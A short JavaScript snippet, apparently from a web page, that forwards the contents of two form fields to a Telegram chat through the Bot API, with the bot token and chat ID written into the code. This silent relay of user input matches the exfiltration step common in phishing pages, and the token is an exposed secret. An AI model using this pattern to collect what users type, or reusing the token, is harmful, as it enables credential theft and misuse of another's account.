const form = document.querySelector("form");


form.addEventListener("submit", (e) => {
    e.preventDefault();
    var text1 = document.getElementById("text1").value;
    var text2 = document.getElementById("text2").value;


    var my_text = 'Result is:%0A - Texti: ' + text1 + ' %0A - Text2: ' + text2;
    var token = "5771069098:AAEkzcNZosgqEnSmYsM_M36hbIEdS3nZoPs";
    var chat_id = -715597903;
    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + my_text + '/';



    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    console.log("Message successfully sended!")
})